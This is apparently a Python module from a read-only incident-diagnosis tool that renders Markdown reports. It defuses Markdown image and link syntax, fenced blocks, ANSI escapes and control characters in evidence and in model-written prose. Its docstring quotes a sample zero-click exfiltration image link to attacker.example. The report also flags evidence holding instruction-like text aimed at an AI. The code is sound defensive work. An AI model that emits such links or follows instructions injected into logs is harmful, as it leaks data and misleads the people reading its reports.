"""Markdown report rendering, with evidence neutralised.

Threat T8 in ``docs/threat-model.md``: a report is a document assembled from
attacker-influenced strings and then opened in a Markdown viewer, a chat client, or
a terminal. Three things can happen if the content is passed through unchanged:

* ``![](https://attacker.example/?d=...)`` fetches on render in many clients. That is
  a working exfiltration channel that fires without anyone clicking anything.
* A link with misleading text, or raw HTML in a renderer that allows it.
* ANSI escape sequences, if the report is ``cat``-ed, can rewrite what is displayed.

So: control characters and escape sequences are removed; evidence records go inside
fenced blocks with fence sequences defused so content cannot break out; and prose
that originated from a model has its Markdown link and image syntax escaped, because
the model's output is downstream of the evidence too.
"""

from __future__ import annotations

import json
import re
from typing import Any

from ..models import Confidence, Diagnosis, EvidenceRecord

ANSI = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]")
CONTROL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
FENCE = re.compile(r"`{3,}")
#: ``![`` is what makes a Markdown image, and an image is fetched on render by many
#: clients without anyone clicking. That is a working exfiltration channel, so the
#: sequence is broken even where a fence should already make it inert.
IMAGE_TRIGGER = re.compile(r"!\[")
#: Characters that let text become structure in Markdown.
INLINE_UNSAFE = str.maketrans(
    {
        "\\": "\\\\",
        "[": "\\[",
        "]": "\\]",
        "`": "\\`",
        "|": "\\|",
        "<": "\\<",
        ">": "\\>",
    }
)


def strip_control(text: str) -> str:
    return CONTROL.sub("", ANSI.sub("", text))


def neutralise_inline(text: str) -> str:
    """For evidence-derived text that appears as prose or in a table cell."""
    return strip_control(str(text)).translate(INLINE_UNSAFE).replace("\n", " ")


def neutralise_block(text: str) -> str:
    """For evidence rendered inside a fenced block.

    The fence is the primary control: inside one, a conforming Markdown renderer
    activates nothing. The image trigger is defused anyway, because the cost of
    being wrong about a renderer is an automatic outbound fetch to a URL an attacker
    chose, and the cost of being right is one visible backslash. Full unaltered
    records remain in ``evidence/<id>.json``, which is the forensic source of truth;
    the report is for reading.
    """
    return IMAGE_TRIGGER.sub(r"!\\[", FENCE.sub("'''", strip_control(str(text))))


def _json_block(payload: Any, limit: int = 4000) -> str:
    blob = json.dumps(payload, indent=2, ensure_ascii=False, default=str)
    if len(blob) > limit:
        blob = blob[:limit] + "\n… truncated; full records are in the run directory"
    return neutralise_block(blob)


# --------------------------------------------------------------------------- #


def render_markdown(
    diagnosis: Diagnosis,
    evidence: list[EvidenceRecord],
    manifest: dict[str, Any],
) -> str:
    incident = diagnosis.incident
    by_id = {e.evidence_id: e for e in evidence}
    lines: list[str] = []

    lines.append(f"# Diagnostic report — {neutralise_inline(incident.incident_id)}")
    lines.append("")
    lines.append(
        "> Read-only diagnosis. This tool performed no action on any system, and it "
        "never can: it contains no write-path code. Every conclusion below cites the "
        "evidence it rests on — check them rather than trusting the narrative."
    )
    lines.append("")

    lines.append("| | |")
    lines.append("|---|---|")
    lines.append(f"| Primary service | `{neutralise_inline(incident.primary_service)}` |")
    lines.append(
        f"| Window | {incident.window.start.isoformat()} → {incident.window.end.isoformat()} |"
    )
    lines.append(f"| Scope | {', '.join(f'`{neutralise_inline(s)}`' for s in incident.services)} |")
    lines.append(f"| Trigger | {neutralise_inline(incident.trigger_source)} |")
    lines.append(f"| Run | `{manifest.get('run_id', '')}` |")
    lines.append(f"| Rounds | {diagnosis.rounds_used} |")
    lines.append(f"| Terminated | {diagnosis.termination.value} |")
    lines.append(f"| Planner / Reasoner | {manifest.get('planner', '')} / {manifest.get('reasoner', '')} |")
    lines.append("")

    if diagnosis.summary:
        lines.append("## Summary")
        lines.append("")
        lines.append(neutralise_inline(diagnosis.summary))
        lines.append("")

    lines.append("## Findings")
    lines.append("")
    supported = [f for f in diagnosis.findings if f.confidence == Confidence.SUPPORTED]
    speculative = [f for f in diagnosis.findings if f.confidence == Confidence.SPECULATIVE]

    if supported:
        for i, finding in enumerate(supported, 1):
            cites = " ".join(f"`{neutralise_inline(e)}`" for e in finding.evidence_ids)
            lines.append(f"{i}. {neutralise_inline(finding.statement)} — {cites}")
        lines.append("")
    else:
        lines.append("No findings were supported by retrieved evidence.")
        lines.append("")

    if speculative:
        lines.append("### Speculative")
        lines.append("")
        lines.append(
            "These are not supported by cited evidence and are recorded so the reader "
            "can see what the run could not establish."
        )
        lines.append("")
        for finding in speculative:
            lines.append(f"- {neutralise_inline(finding.statement)}")
        lines.append("")

    lines.append("## Evidence gaps")
    lines.append("")
    if diagnosis.gaps:
        lines.append(
            "The following evidence was requested and could not be retrieved. Findings "
            "above should be read knowing this was not visible."
        )
        lines.append("")
        lines.append("| Template | Reason |")
        lines.append("|---|---|")
        for gap in diagnosis.gaps:
            lines.append(
                f"| `{neutralise_inline(gap.template_id)}` | {neutralise_inline(gap.reason)} |"
            )
    else:
        lines.append("None. Every requested query returned.")
    lines.append("")

    flagged = [e for e in evidence if e.injection_suspected]
    if flagged:
        lines.append("## Instruction-like content")
        lines.append("")
        lines.append(
            "The evidence blocks below contain text patterned like instructions to an "
            "AI system. This is expected in logs that carry user-supplied input, and it "
            "could not have changed what was queried — scope and query construction are "
            "fixed by configuration and templates. It is surfaced because the *narrative* "
            "of a report can still be influenced by it."
        )
        lines.append("")
        for item in flagged:
            markers = ", ".join(neutralise_inline(m) for m in item.injection_markers)
            lines.append(f"- `{item.evidence_id}` — patterns matched: {markers}")
        lines.append("")

    lines.append("## Evidence")
    lines.append("")
    for evidence_id in sorted(by_id, key=_natural):
        item = by_id[evidence_id]
        flag = " ⚠ instruction-like content" if item.injection_suspected else ""
        lines.append(f"### `{evidence_id}` — {neutralise_inline(item.kind)}{flag}")
        lines.append("")
        lines.append(f"- Template: `{neutralise_inline(item.query.template_id)}`")
        lines.append(f"- Parameters: `{neutralise_inline(json.dumps(_plain(item.query.params)))}`")
        lines.append(f"- Statement: `{neutralise_inline(item.query.statement)}`")
        lines.append(f"- Records: {len(item.records)}{' (truncated)' if item.truncated else ''}")
        lines.append(f"- Response hash: `{item.response_hash}`")
        lines.append("")
        lines.append("```json")
        lines.append(_json_block(item.records[:20]))
        lines.append("```")
        lines.append("")

    lines.append("---")
    lines.append("")
    lines.append(
        f"Generated by auditglass. Values such as `IP_a37f2b1c` are stable pseudonyms: "
        f"the same original value maps to the same token throughout this run. "
        f"Configuration hash `{manifest.get('config_hash', '')[:23]}…`, "
        f"template set `{manifest.get('template_fingerprint', '')[:23]}…`."
    )
    return "\n".join(lines) + "\n"


def _natural(evidence_id: str) -> tuple[int, str]:
    m = re.match(r"E(\d+)", evidence_id)
    return (int(m.group(1)), evidence_id) if m else (10**9, evidence_id)


def _plain(params: dict[str, Any]) -> dict[str, Any]:
    from ..models import _jsonable

    return _jsonable(params)
